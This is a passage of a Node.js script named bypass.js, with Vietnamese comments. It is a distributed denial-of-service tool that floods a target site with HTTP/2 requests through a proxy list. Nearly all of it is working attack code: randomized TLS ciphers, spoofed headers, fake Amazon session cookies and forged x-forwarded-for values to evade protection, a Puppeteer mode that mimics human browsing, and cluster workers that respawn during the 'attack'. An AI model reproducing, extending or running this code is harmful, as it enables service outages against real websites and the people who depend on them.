     'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
     'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
     "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
     
     'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
     'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
     'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
     
     
     'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
     ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
     'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
     'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
      "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
      "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
      ];
const country = [
      "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
      "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
      "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
      "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
      "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
      "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
      "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
      "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
      "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
      "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
      "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
      "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
      "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
      "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
      "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
      "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
    ];
const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"];
const SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_TLSv1_3 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_method";
const secureContextOptions = { ciphers, sigalgs: SignalsList, honorCipherOrder: true, secureOptions, secureProtocol };
const secureContext = tls.createSecureContext(secureContextOptions);

// Xử lý tham số dòng lệnh
const args = process.argv.slice(2);
const flags = args.filter(arg => arg.startsWith('--'));
const params = args.filter(arg => !arg.startsWith('--'));
if (params.length < 5) {
    console.log(`Usage: node bypass.js <host> <time> <req> <thread> <proxy.txt> [--all] [--debug] [--browser] [--large] [--timeout=<seconds>]`.yellow);
    process.exit();
}

const target = params[0];
const time = ~~params[1];
const rate = ~~params[2];
const threads = ~~params[3];
const proxyfile = params[4];
const allMode = flags.includes('--all');
const debugMode = flags.includes('--debug');
const browserMode = flags.includes('--browser');
const largeMode = flags.includes('--large');
const timeoutFlag = flags.find(f => f.startsWith('--timeout='));
const timeout = timeoutFlag ? parseInt(timeoutFlag.split('=')[1], 10) : 0;

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
const parsedTarget = url.parse(target);

// Hàm ngẫu nhiên
const randomElement = (array) => array[Math.floor(Math.random() * array.length)];
const randstr = (length) => {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
    return result;
};
const generateAmazonCookie = () => `session-id=${randstr(13)}-${randstr(19)}; ubid-main=${randstr(13)}-${randstr(19)}; x-main=${randstr(32)}; at-main=${randstr(64)}; sess-at-main=${randstr(64)}`;

// Hàm bypass Layer 7 cơ bản (HTTP/2) - giữ nguyên từ mã trước
function bypassLayer7(target, proxy, rate, duration) {
    const parsedUrl = url.parse(target);
    const [proxyHost, proxyPort] = proxy.split(':');

    const tlsOptions = {
        host: parsedUrl.hostname,
        port: 443,
        ciphers: largeMode && parsedUrl.hostname.includes('amazon') ? "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES256-GCM-SHA384" : randomElement(cplist),
        secureProtocol: "TLS_method",
        servername: parsedUrl.hostname,
        rejectUnauthorized: false,
        ALPNProtocols: ["h2"],
        ecdhCurve,
        sigalgs: SignalsList,
        secureOptions,
        secureContext,
        socket: new net.Socket(),
        keepAlive: true,
        keepAliveMsecs: timeout ? timeout * 1000 : 10000
    };

    tlsOptions.socket.connect(proxyPort, proxyHost, () => {
        tlsOptions.socket.write(`CONNECT ${parsedUrl.hostname}:443 HTTP/1.1\r\nHost: ${parsedUrl.hostname}\r\nConnection: keep-alive\r\n\r\n`);
    });

    tlsOptions.socket.on('data', (data) => {
        if (data.toString().includes('200 Connection established')) {
            const tlsConn = tls.connect(tlsOptions, () => {
                const client = http2.connect(target, {
                    createConnection: () => tlsConn,
                    settings: { headerTableSize: 65535, maxConcurrentStreams: 1000, initialWindowSize: 6291456, maxHeaderListSize: 262144 }
                });

                client.on('connect', () => {
                    const connectionEndTime = timeout ? Date.now() + timeout * 1000 : Date.now() + duration * 1000;
                    const floodEndTime = Date.now() + duration * 1000;
                    let requestCount = 0;
                    let retryDelay = 0;

                    function flood() {
                        if (Date.now() > floodEndTime) {
                            if (Date.now() >= connectionEndTime) {
                                client.close();
                                tlsConn.end();
                                if (debugMode) console.log(`[${proxy}] Total requests sent: ${requestCount}`.cyan);
                            }
                            return;
                        }

                        for (let i = 0; i < rate; i++) {
                            const headers = {
                                ':method': 'GET',
                                ':path': largeMode && parsedUrl.hostname.includes('amazon') ? `${parsedUrl.path}/dp/${randstr(10)}?ref_=nav_em_T1_${randstr(5)}` : (allMode || largeMode ? `${parsedUrl.path}?${randstr(3)}=${randstr(10)}` : parsedUrl.path),
                                ':scheme': 'https',
                                ':authority': parsedUrl.hostname,
                                'accept': largeMode && parsedUrl.hostname.includes('amazon') ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" : randomElement(accept_header),
                                'accept-language': largeMode && parsedUrl.hostname.includes('amazon') ? "en-US,en;q=0.9" : randomElement(language_header),
                                'accept-encoding': 'gzip, deflate, br',
                                'cache-control': randomElement(cache_header),
                                'referer': largeMode && parsedUrl.hostname.includes('amazon') ? `https://www.amazon.com/s?k=${randstr(5)}` : randomElement(refers),
                                'user-agent': largeMode && parsedUrl.hostname.includes('amazon') ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" : `Mozilla/5.0 (${randomElement(country)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.${randstr(4)}.124 Safari/537.36`,
                                'cookie': largeMode && parsedUrl.hostname.includes('amazon') ? generateAmazonCookie() : (allMode || largeMode ? generateAmazonCookie() : undefined),
                                'sec-fetch-site': randomElement(fetch_site),
                                'sec-fetch-mode': randomElement(fetch_mode),
                                'sec-fetch-dest': randomElement(fetch_dest),
                                'upgrade-insecure-requests': '1',
                                'dnt': '1',
                                'x-forwarded-for': allMode || largeMode ? `${randomElement(country)}.${randstr(3)}.${randstr(3)}.${randstr(3)}` : undefined,
                                'x-amz-user-agent': largeMode && parsedUrl.hostname.includes('amazon') ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) amz-sdk-js/3.${randstr(3)}` : undefined,
                                'x-amz-security-token': largeMode && parsedUrl.hostname.includes('amazon') ? randstr(64) : undefined,
                                'cloudfront-viewer-country': largeMode && parsedUrl.hostname.includes('amazon') ? randomElement(country) : undefined
                            };

                            const stream = client.request(headers);
                            stream.on('response', (res) => {
                                requestCount++;
                                if (debugMode) console.log(`[${proxy}] Request ${requestCount} - Status: ${res[':status']}`.green);
                                if (res[':status'] === 429) {
                                    retryDelay = Math.min(retryDelay + 1000, 5000);
                                    if (debugMode) console.log(`[${proxy}] Rate limited, delaying ${retryDelay}ms`.yellow);
                                } else {
                                    retryDelay = 0;
                                }
                                if (!timeout) stream.close();
                            });
                            stream.on('error', () => {});
                            if (!timeout) stream.end();
                        }

                        if (retryDelay) {
                            setTimeout(flood, retryDelay);
                        } else {
                            setImmediate(flood);
                        }
                    }

                    flood();

                    if (timeout) {
                        setTimeout(() => {
                            client.close();
                            tlsConn.end();
                            if (debugMode) console.log(`[${proxy}] Connection closed after ${timeout}s with ${requestCount} requests`.cyan);
                        }, timeout * 1000);
                    }
                });

                client.on('error', (err) => {
                    if (debugMode) console.error(`[${proxy}] HTTP2 Error: ${err.message}`.red);
                    tlsConn.end();
                });
            });

            tlsConn.on('error', (err) => {
                if (debugMode) console.error(`[${proxy}] TLS Error: ${err.message}`.red);
            });
        }
    });

    tlsOptions.socket.on('error', (err) => {
        if (debugMode) console.error(`[${proxy}] Socket Error: ${err.message}`.red);
    });
}

// Hàm bypass bằng browser (Puppeteer) với retry logic
async function browserBypass(target, proxy, rate, duration) {
    const [proxyHost, proxyPort] = proxy.split(':');
    let browser;
    const maxRetries = 3;
    let retryCount = 0;

    // Thử khởi động browser với retry
    while (!browser && retryCount < maxRetries) {
        try {
            browser = await puppeteer.launch({
                headless: true,
                executablePath: '/usr/bin/google-chrome', // Dùng Chrome đã cài sẵn nếu có (tùy chỉnh theo hệ thống)
                args: [
                    `--proxy-server=${proxyHost}:${proxyPort}`,
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-infobars',
                    '--ignore-certificate-errors',
                    '--disable-dev-shm-usage', // Giảm sử dụng shared memory
                    '--disable-gpu', // Tắt GPU để ổn định hơn trên server
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                ]
            });
        } catch (err) {
            retryCount++;
            if (debugMode) console.error(`[${proxy}] Failed to launch browser (attempt ${retryCount}/${maxRetries}): ${err.message}`.red);
            if (retryCount < maxRetries) {
                await new Promise(resolve => setTimeout(resolve, 2000 * retryCount)); // Delay tăng dần
            } else {
                throw new Error(`Failed to launch browser after ${maxRetries} attempts`);
            }
        }
    }

    if (!browser) return;

    const endTime = Date.now() + duration * 1000;

    async function floodPage() {
        if (Date.now() > endTime) {
            await browser.close();
            return;
        }

        const page = await browser.newPage();
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            req.continue({
                headers: {
                    'Accept': randomElement(accept_header),
                    'Accept-Language': randomElement(language_header),
                    'Referer': largeMode && parsedTarget.hostname.includes('amazon') ? `https://www.amazon.com/s?k=${randstr(5)}` : randomElement(refers),
                    'Cookie': generateAmazonCookie()
                }
            });
        });

        let requestCount = 0;

        try {
            await page.goto(target, { waitUntil: 'networkidle2', timeout: 60000 });
            if (debugMode) console.log(`[${proxy}] Browser loaded: ${await page.title()}`.green);
            requestCount++;

            const actions = [
                async () => {
                    const elements = await page.$$('a, button, div');
                    if (elements.length) {
                        const randomElement = randomElement(elements);
                        await randomElement.click();
                        if (debugMode) console.log(`[${proxy}] Clicked element`.green);
                        requestCount++;
                    }
                },
                async () => {
                    await page.evaluate(() => window.scrollTo(0, Math.random() * document.body.scrollHeight));
                    if (debugMode) console.log(`[${proxy}] Scrolled page`.green);
                },
                async () => {
                    if (parsedTarget.hostname.includes('amazon')) {
                        const searchBox = await page.$('#twotabsearchtextbox');
                        if (searchBox) {
                            const searchTerm = randstr(5);
                            await searchBox.type(searchTerm);
                            await page.keyboard.press('Enter');
                            if (debugMode) console.log(`[${proxy}] Searched for "${searchTerm}"`.green);
                            requestCount++;
                            await page.waitForNavigation({ waitUntil: 'networkidle2' });
                            const products = await page.$$('.s-result-item a');
                            if (products.length) {
                                const randomProduct = randomElement(products);
                                await randomProduct.click();
                                if (debugMode) console.log(`[${proxy}] Clicked product`.green);
                                requestCount++;
                            }
                        }
                    }
                },
                async () => {
                    const inputs = await page.$$('input[type="text"], input[type="search"]');
                    if (inputs.length) {
                        const randomInput = randomElement(inputs);
                        await randomInput.type(randstr(5));
                        if (debugMode) console.log(`[${proxy}] Typed in input`.green);
                        requestCount++;
                    }
                },
                async () => {
                    await page.mouse.move(Math.random() * 1000, Math.random() * 1000);
                    if (debugMode) console.log(`[${proxy}] Moved mouse`.green);
                }
            ];

            if (timeout) {
                const pageStartTime = Date.now();
                let retryDelay = 0;
                while (Date.now() - pageStartTime < timeout * 1000 && Date.now() < endTime) {
                    try {
                        const action = randomElement(actions);
                        await action();
                        await page.reload({ waitUntil: 'networkidle2' });
                        if (debugMode) console.log(`[${proxy}] Page reloaded - Request count: ${requestCount}`.green);
                        requestCount++;
                        retryDelay = 0;
                    } catch (err) {
                        if (err.message.includes('429')) {
                            retryDelay = Math.min(retryDelay + 1000, 5000);
                            if (debugMode) console.log(`[${proxy}] Rate limited, delaying ${retryDelay}ms`.yellow);
                        } else if (debugMode) console.error(`[${proxy}] Action Error: ${err.message}`.red);
                    }
                    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000 + retryDelay));
                }
            } else {
                const action = randomElement(actions);
                await action();
            }
        } catch (err) {
            if (debugMode) console.error(`[${proxy}] Browser Error: ${err.message}`.red);
        } finally {
            await page.close();
            if (debugMode) console.log(`[${proxy}] Page closed with ${requestCount} requests`.cyan);
            setImmediate(floodPage);
        }
    }

    for (let i = 0; i < rate; i++) floodPage();
}

// Logic chính với cluster
if (cluster.isMaster) {
    console.clear();
    console.log(`Starting flood on ${target} for ${time}s with ${threads} threads${allMode ? ' [ALL]' : ''}${browserMode ? ' [BROWSER]' : ''}${largeMode ? ' [LARGE]' : ''}${timeout ? ` [TIMEOUT=${timeout}s]` : ''}`.cyan);
    for (let i = 0; i < threads; i++) cluster.fork();

    setTimeout(() => {
        console.log('Attack finished'.green);
        process.exit(0);
    }, time * 1000);

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died`.red);
        cluster.fork();
    });
} else {
    for (let i = 0; i < rate; i++) {
        setInterval(() => {
            const proxyChoice = randomElement(proxy);
            if (browserMode) {
                browserBypass(target, proxyChoice, rate, time).catch(err => {
                    if (debugMode) console.error(`[${proxyChoice}] Browser Mode Error: ${err.message}`.red);
                });
            } else {
                bypassLayer7(target, proxyChoice, rate, time);
            }
        }, allMode || largeMode ? 50 : browserMode ? 1000 : 500);
    }
}

// Các hàm hỗ trợ khác
const getRandomChar = () => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)];
let randomPathSuffix = '';
setInterval(() => randomPathSuffix = getRandomChar(), 3333);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});